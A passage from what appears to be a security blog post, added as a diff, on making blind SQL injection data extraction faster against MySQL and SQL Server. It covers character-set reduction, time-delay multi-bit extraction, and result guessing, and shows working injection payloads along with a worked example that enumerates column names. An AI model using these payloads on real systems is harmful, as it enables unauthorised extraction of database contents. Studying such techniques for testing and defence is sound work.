+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> !"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_
+</code></pre></div></div>
+
+<p>We can the use the <code class="highlighter-rouge">INSTR</code> function for MySQL or <code class="highlighter-rouge">CHARINDEX</code> function for SQL Server to get the index into our defined character set of the result character we are extracting.</p>
+
+<p><code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">INSTR</span><span class="p">(</span>
+  <span class="s1">' !"#$%&amp;</span><span class="se">''</span><span class="s1">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span class="se">\]</span><span class="s1">^_'</span><span class="p">,</span>
+  <span class="n">SUBSTR</span><span class="p">((</span><span class="n">xxx</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CHARINDEX</span><span class="p">(</span>
+  <span class="k">SUBSTRING</span><span class="p">((</span><span class="n">xxx</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+  <span class="s1">' !"#$%&amp;</span><span class="se">''</span><span class="s1">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span class="se">\]</span><span class="s1">^_'</span>
+<span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the query we want to make and ` !”#$%&amp;’()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_<code class="highlighter-rouge"> is the character set we wish to check against. Both </code>INSTR<code class="highlighter-rouge"> and </code>CHARINDEX` index starting from 1, so we can remove 1 from the result to zeroth index the result.</p>
+
+<p>It should be noted that both <code class="highlighter-rouge">INSTR</code> on MySQL and <code class="highlighter-rouge">CHARINDEX</code> on SQL Server are case insensitive checks so any results using the above queries will be converted to uppercase. For case-sensitive results collation can be used (see +<a href="https://msdn.microsoft.com/en-us/library/ms184391.aspx">COLLATE Transact-SQL</a> and +<a href="http://dev.mysql.com/doc/refman/8.0/en/charset-collation-implementations.html">Collation Implementation Types</a>).</p>
+
+<p>This optimization has the added benefit of allowing us to define a character set including Unicode characters, such as the following character set for the German alphabet:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ABCDEFGHIJKLMNOPQRSTUVWXYZÄÖÜß
+</code></pre></div></div>
+
+<p>This optimization can be taken to the extreme if the exact character set of the target data is known. For example password hashes may use only the following character set:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0123456789ABCDEF
+</code></pre></div></div>
+
+<p>The number of bits required to extract a result character from a defined character set is <code class="highlighter-rouge">ceil(log2(character set length))</code>, therefore a 64 character character set requires 6 bits to be extracted per character, a 32 character character set requires 5 bits per character and a 16 character character set requires only 4 bits per character. Obviously this optimization is only appropriate if a succinct character set can be defined for the result text.</p>
+
+<h3 id="character-set-confirmation">Character set confirmation</h3>
+<p>The character set of the query result will not always be known or guessable. Extracting query results against an inaccurate character set will accidentally exclude characters in the result text, providing a false result. Luckily we can easily check that the result text confirms to a given character set using 1 additional request:</p>
+
+<p><code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)</span> <span class="k">NOT</span> <span class="n">REGEXP</span> <span class="s1">'[^0123456789ABCDEF]'</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">LIKE</span><span class="s1">'%[^0123456789ABCDEF]%'</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the query we want to make and <code class="highlighter-rouge">0123456789ABCDEF</code> is the character set we wish to check against.</p>
+
+<p>This can be extended to check a character set against all values in a query result set in a single request:
+<code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+  <span class="k">SELECT</span> <span class="k">SUM</span><span class="p">(</span><span class="n">sum_result</span><span class="p">)</span> <span class="k">FROM</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">sum_result</span> <span class="k">from</span> <span class="p">(</span>
+      <span class="p">(</span><span class="n">xxx</span><span class="p">)</span>
+    <span class="p">)</span> <span class="k">AS</span> <span class="n">x</span>
+    <span class="k">WHERE</span> <span class="p">(</span><span class="n">yyy</span><span class="p">)</span> <span class="n">REGEXP</span> <span class="s1">'[^0123456789ABCDEF]'</span>
+  <span class="p">)</span> <span class="k">AS</span> <span class="n">y</span>
+<span class="p">)</span> <span class="k">IS</span> <span class="k">NULL</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+  <span class="k">SELECT</span> <span class="k">SUM</span><span class="p">(</span><span class="n">sum_result</span><span class="p">)</span> <span class="k">FROM</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">sum_result</span> <span class="k">FROM</span> <span class="p">(</span>
+      <span class="p">(</span><span class="n">xxx</span><span class="p">)</span>
+    <span class="p">)</span> <span class="k">AS</span> <span class="n">x</span>
+    <span class="k">WHERE</span> <span class="p">(</span><span class="n">yyy</span><span class="p">)</span> <span class="k">LIKE</span> <span class="s1">'%[^0123456789ABCDEF]%'</span>
+  <span class="p">)</span> <span class="k">AS</span> <span class="n">y</span>
+<span class="p">)</span> <span class="k">IS</span> <span class="k">NULL</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the query we want to make, <code class="highlighter-rouge">(yyy)</code> is the column name we are selecting and <code class="highlighter-rouge">0123456789ABCDEF</code> is the character set we wish to check against. Combining character set reduction and confirmation can efficiently define a reduced character set which significantly reduces the number of requests required to extract the result data.</p>
+
+<h2 id="multi-bit-requests">Multi bit requests</h2>
+<h3 id="extracting-2-bits-of-information">Extracting 2 bits of information</h3>
+<p>Typically with blind SQL injection we extract one bit of information per request, namely true or false. Further bits of information can often be extracted by introducing response delays through SQL sleep functions.</p>
+
+<p>Combining the two bits of information from boolean results and time delays we can receive four possible results for each request:</p>
+<ul>
+  <li>False result with no delay (00)</li>
+  <li>True result with no delay (01)</li>
+  <li>False result with delay (10)</li>
+  <li>True result with delay (11)</li>
+</ul>
+
+<p>The MySQL <code class="highlighter-rouge">SLEEP</code> function and SQL Server <code class="highlighter-rouge">WAITFOR DELAY</code> statement can be used to introduce the required timed delays into the SQL query result:</p>
+
+<p><code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">test</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">)</span> <span class="o">+</span> <span class="p">(</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">test</span><span class="o">&amp;</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span> <span class="k">THEN</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">)</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="p">(</span><span class="n">zzz</span><span class="p">)</span> <span class="k">AS</span> <span class="n">test</span><span class="p">)</span> <span class="k">as</span> <span class="n">x</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="n">zzz</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span><span class="p">;</span>
+<span class="n">IF</span><span class="p">((</span><span class="n">zzz</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+  <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s1">'00:00:05'</span>
+<span class="k">ELSE</span>
+  <span class="k">SELECT</span> <span class="mi">0</span><span class="p">;</span><span class="c1">--</span>
+</code></pre></div></div>
+
+<p>Where <code class="highlighter-rouge">(zzz)</code> is the bit result of the current slice of the query we want to make. Unfortunately the SQL Server <code class="highlighter-rouge">WAITFOR DELAY</code> statement is particularly sensitive to it’s placement in a SQL query, not allowing it to be placed within subqueries. To get around this constraint we may be able to use stacked queries as show above. With stacked queries we must perform our query twice per request, once for the boolean return bit and once for the time delay bit. Stacked queries will not always be viable, so another option for introducing time delays is through the use of heavy queries +<a href="https://www.defcon.org/images/defcon-16/dc16-presentations/alonso-parada/defcon-16-alonso-parada-wp.pdf">Time-Based Blind SQL Injection using Heavy Queries</a>.</p>
+
+<p>Using this method we can extract 2 bits of information per request.</p>
+
+<h3 id="extracting-3-bits-of-information">Extracting 3+ bits of information</h3>
+<p>As described in a post by Hack All The Things +<a href="http://howto.hackallthethings.com/2016/07/extracting-multiple-bits-per-request.html">Extracting Multiple Bits Per Request From Full-blind SQL Injection Vulnerabilities</a>, time-based techniques can be used to extract multiple bits in a single request. This method essentially chunks the result delay into time segments which can be decoded into bit values.</p>
+
+<p>The number of bits which can be accurately extracted in a single request can be calculated by <code class="highlighter-rouge">max_bits = log2((max_timeout/max_rrt) + 1) - (log2((max_timeout/max_rrt) + 1) % 1)</code> where <code class="highlighter-rouge">max_timeout</code> is the largest delay the database server will allow a query to delay without throwing an error and <code class="highlighter-rouge">max_rrt</code> is the maximum Round Trip Time (RRT) we can expect from the target server under load. Some examples of the number of bits that can be extracted per request are:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Max Timeout</th>
+      <th>Max RRT</th>
+      <th>Max bits per request</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>60</td>
+      <td>4</td>
+      <td>4</td>
+    </tr>
+    <tr>
+      <td>35</td>
+      <td>5</td>
+      <td>3</td>
+    </tr>
+    <tr>
+      <td>18</td>
+      <td>6</td>
+      <td>2</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The time segments to bit mapping for a server with a max query timeout of 18 seconds and a max RRT of 4 seconds would be:</p>
+<ul>
+  <li>0 second delay (00)</li>
+  <li>6 second delay (01)</li>
+  <li>12 second delay (10)</li>
+  <li>18 second delay (11)</li>
+</ul>
+
+<p>We can combine this with the boolean result to add an additional response bit:</p>
+<ul>
+  <li>False result with 0 second delay (000)</li>
+  <li>True result with 0 second delay (001)</li>
+  <li>False result with 6 second delay (010)</li>
+  <li>True result with 6 second delay (011)</li>
+  <li>Etc.</li>
+</ul>
+
+<p><code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">test</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">),</span> <span class="p">(</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">test</span><span class="o">&amp;</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span> <span class="k">THEN</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">),</span> <span class="p">(</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">test</span><span class="o">&amp;</span><span class="mi">4</span><span class="o">=</span><span class="mi">4</span> <span class="k">THEN</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">)</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="p">(</span><span class="n">zzz</span><span class="p">)</span> <span class="k">AS</span> <span class="n">test</span><span class="p">)</span> <span class="k">as</span> <span class="n">x</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="n">zzz</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span><span class="p">;</span>
+<span class="n">IF</span><span class="p">((</span><span class="n">zzz</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+  <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s1">'00:00:06'</span>
+<span class="k">ELSE</span>
+  <span class="k">SELECT</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">IF</span><span class="p">((</span><span class="n">zzz</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">4</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+  <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s1">'00:00:12'</span>
+<span class="k">ELSE</span>
+  <span class="k">SELECT</span> <span class="mi">0</span><span class="p">;</span><span class="c1">--</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(zzz)</code> is the bit result of the current slice of the query we want to make.</p>
+
+<h2 id="result-guessing">Result guessing</h2>
+<p>In some circumstances the result of a query may be known to be in a tight set of pre known candidates, for example SQL data types (<code class="highlighter-rouge">CHAR</code>, <code class="highlighter-rouge">VARCHAR</code>, <code class="highlighter-rouge">BLOB</code>, etc.) in which case knowing only a partial result could allow us to guess the exact result. For example, given the input corpus:</p>
+<ul>
+  <li>Alice</li>
+  <li>Bob</li>
+  <li>Charlie</li>
+  <li>Doogle</li>
+  <li>Emily</li>
+</ul>
+
+<p>To determine the result is <code class="highlighter-rouge">Charlie</code> we need only determine the first character is a <code class="highlighter-rouge">C</code>, as <code class="highlighter-rouge">Charlie</code> is the only candidate starting with the character <code class="highlighter-rouge">C</code>.</p>
+
+<p>If we have a tightly defined input corpus of all possible results, we can easily calculate the minimum number of requests to uniquely identify a candidate from the input corpus and perform only those requests. For example, given the input corpus above we only have to query the 3 least significant bits of the first character to determine the result:</p>
+
+<p><code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">(</span><span class="s1">'Alice'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">7</span>   <span class="o">#</span><span class="mi">0</span><span class="n">b001</span>
+<span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">(</span><span class="s1">'Bob'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">7</span>     <span class="o">#</span><span class="mi">0</span><span class="n">b010</span>
+<span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">(</span><span class="s1">'Charlie'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">7</span> <span class="o">#</span><span class="mi">0</span><span class="n">b011</span>
+<span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">(</span><span class="s1">'Doogle'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">7</span>  <span class="o">#</span><span class="mi">0</span><span class="n">b100</span>
+<span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">(</span><span class="s1">'Emily'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">7</span>   <span class="o">#</span><span class="mi">0</span><span class="n">b101</span>
+</code></pre></div></div>
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="s1">'Alice'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">7</span>   <span class="c1">--0b001</span>
+<span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="s1">'Bob'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">7</span>     <span class="c1">--0b010</span>
+<span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="s1">'Charlie'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">7</span> <span class="c1">--0b011</span>
+<span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="s1">'Doogle'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">7</span>  <span class="c1">--0b100</span>
+<span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="s1">'Emily'</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">7</span>   <span class="c1">--0b101</span>
+</code></pre></div></div>
+
+<p>If we have a loosely defined input corpus with only a subset of possible results we can still use this optimization. Any bit of information from the query result can be used to reduce the input corpus. Once we have only a small number of remaining candidates we can check the query result against these candidates in order to confirm the result. We can extend this to choose the order we request the bits of the result based on the number of candidates from the input corpus the requested bits will eliminate. Ideally each request should eliminate half, or as close as possible, of the input corpus, thus allowing a divide and conquer search through the corpus. Using this method to reduce an input corpus of 256 candidates would take approximately 8 requests.</p>
+
+<p>We can take this one step further and learn about results from the target database itself. In certain datasets values are often repeated, for example in table column names. If we determine that one table has a column name of <code class="highlighter-rouge">Created</code> we can add that to our column name corpus. We can then use the updated column name corpus when querying the columns of another table.</p>
+
+<p>In tests this method has been shown to significantly reduce the number of requests required to enumerate table structures.</p>
+
+<h2 id="confirming-results">Confirming results</h2>
+
+<p>Building upon result guessing we can easily confirm our guesses against the database for accuracy, requiring only one additional request:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)</span><span class="o">=</span><span class="s1">'Alice'</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the result we want to confirm and <code class="highlighter-rouge">Alice</code> is the guess candidate.</p>
+
+<p>Further to this can confirm or test multiple potential results in a single request; <code class="highlighter-rouge">(2^n) - 1</code> candidates per request where <code class="highlighter-rouge">n</code> is the number of bits we can extract from each request. For example, if we can extract 2 bits of information per request we can test 3 guesses, 3 bits means we can test 7 guesses:
+<code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">INSTR</span><span class="p">(</span><span class="s1">'______Alice__Bob____Charlie'</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">))</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">255</span>
+</code></pre></div></div>
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">CHARINDEX</span><span class="p">((</span><span class="n">xxx</span><span class="p">),</span> <span class="s1">'______Alice__Bob____Charlie'</span><span class="p">)</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the result we want to confirm and <code class="highlighter-rouge">Alice</code>, <code class="highlighter-rouge">Bob</code>, and <code class="highlighter-rouge">Charlie</code> are the guess candidates. We use the string index functions, <code class="highlighter-rouge">INSTR</code> for MySQL and <code class="highlighter-rouge">CHARINDEX</code> for SQL Server, to return the index into the candidate string of the result. The returned value divided by the length of the padded guess candidates, in the above case <code class="highlighter-rouge">7</code>, gives us the a result in the binary range <code class="highlighter-rouge">00</code> to <code class="highlighter-rouge">11</code>.  A result of <code class="highlighter-rouge">01</code> would be returned if <code class="highlighter-rouge">Alice</code> is the correct result, <code class="highlighter-rouge">10</code> for <code class="highlighter-rouge">Bob</code>, <code class="highlighter-rouge">11</code> for <code class="highlighter-rouge">Charlie</code> and <code class="highlighter-rouge">00</code> for none of the guesses being correct.</p>
+
+<p>Combining result guessing and confirmation we can whittle down an input corpus based on retrieved bits of information, and when we have only a small number of candidates remaining perform a single request to check if any of the remaining candidates are correct. This allows us to efficiently check a result against a predefined or discovered input corpus.</p>
+
+<h1 id="summary">Summary</h1>
+<p>Combining the bitwise character extraction, character set reduction and temporal inference as described above we can often reliably extract query result text using at most 2 requests per character, 2 requests for the <code class="highlighter-rouge">null</code> character length check and two optional requests (character set confirmation and result confirmation).</p>
+
+<p>To illustrate the efficiency of these optimizations consider the following table showing the number of requests required to extract the text response from a query result with length 16:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Technique</th>
+      <th>Result Requests</th>
+      <th>Additional Requests</th>
+      <th>Total Requests</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Data extraction techniques</strong></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Naive byte extraction</td>
+      <td>4,096</td>
+      <td>256 (LC)</td>
+      <td>4,352</td>
+    </tr>
+    <tr>
+      <td>Divide and conquer byte extraction</td>
+      <td>128</td>
+      <td>8 (LC)</td>
+      <td>136</td>
+    </tr>
+    <tr>
+      <td><em>Bitwise byte extraction</em></td>
+      <td>128</td>
+      <td>8 (LC)</td>
+      <td><strong>136</strong></td>
+    </tr>
+    <tr>
+      <td><strong>Character set optimizations</strong></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>ASCII character extraction</td>
+      <td>112</td>
+      <td>7 (LC)</td>
+      <td>119</td>
+    </tr>
+    <tr>
+      <td><em>Character set reduction</em></td>
+      <td>96</td>
+      <td>6 (LC) + 1 (CS)</td>
+      <td><strong>103</strong></td>
+    </tr>
+    <tr>
+      <td><strong>Multi bit requests</strong></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Extracting 2 bits of information</td>
+      <td>48</td>
+      <td>3 (LC) + 1 (CS) + 1 (RC)</td>
+      <td>53</td>
+    </tr>
+    <tr>
+      <td><em>Extracting 3+ bits of information</em></td>
+      <td>32</td>
+      <td>2 (LC) + 1 (CS) + 1 (RC)</td>
+      <td><strong>36</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="highlighter-rouge">LC</code>: Length Check request
+<code class="highlighter-rouge">CS</code>: Character Set request
+<code class="highlighter-rouge">RC</code>: Result Confirmation request</p>
+
+<p>Even over reasonably efficient bitwise ASCII character extraction the outlined optimizations can save 83 requests on a 16 character query result. On top of this, if the result we are querying is in a known or discovered input corpus it can often be extracted using result guessing in fewer than 8 requests.</p>
+
+<h1 id="thanks">Thanks</h1>
+<p>Thanks to Pentest Monkey for the excellent SQL injection cheat sheets +<a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection">SQL Injection Cheat Sheets by Pentest Monkey</a>.</p>
+
+<p>Thanks to SQLZoo +<a href="http://sqlzoo.net/">SQLZoo</a> for providing a sandbox in which these methods could be tested and refined.</p>
+
+<h1 id="worked-example">Worked Example</h1>
+
+<p>Worked example extracting 2 bits per request (result + temporal) with character set reduction to query all column names from a table called <code class="highlighter-rouge">games</code>:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- The query we want to execute</span>
+<span class="k">SELECT</span>
+<span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+<span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span><span class="p">;</span>
+
+<span class="c1">-- Check character set is acceptable across all results</span>
+<span class="k">SELECT</span> <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+  <span class="k">SELECT</span> <span class="k">SUM</span><span class="p">(</span><span class="k">result</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="mi">1</span> <span class="k">as</span> <span class="k">result</span> <span class="k">from</span> <span class="p">(</span>
+      <span class="k">SELECT</span>
+      <span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+      <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span>
+    <span class="p">)</span> <span class="k">as</span> <span class="n">x</span> <span class="k">WHERE</span> <span class="k">column_name</span> <span class="n">REGEXP</span> <span class="s1">'[^ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]'</span>
+  <span class="p">)</span> <span class="k">as</span> <span class="n">y</span>
+<span class="p">)</span> <span class="k">IS</span> <span class="k">NULL</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span><span class="p">;</span>
+
+<span class="c1">-- Extract bits 1 &amp; 2 of the first character of the first result</span>
+<span class="k">SELECT</span> <span class="p">(</span>
+  <span class="c1">-- Extract 1st bit through true/false result</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="n">INSTR</span><span class="p">(</span>
+      <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">,</span>
+      <span class="n">SUBSTR</span><span class="p">(</span>
+        <span class="p">(</span>
+          <span class="k">SELECT</span>
+          <span class="k">DISTINCT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
+          <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'games'</span>
+          <span class="k">LIMIT</span> <span class="mi">1</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="c1">-- First result</span>
+        <span class="p">),</span>
+        <span class="mi">1</span><span class="p">,</span> <span class="c1">-- First character</span>
+        <span class="mi">1</span>
+      <span class="p">)</span>
+    <span class="p">)</span>
+  <span class="p">)</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">)</span> <span class="o">+</span> <span class="p">(</span>
+  <span class="c1">-- Extract 2nd bit through temporal result</span>
+  <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="n">INSTR</span><span class="p">(</span>
+      <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="p">,</span>
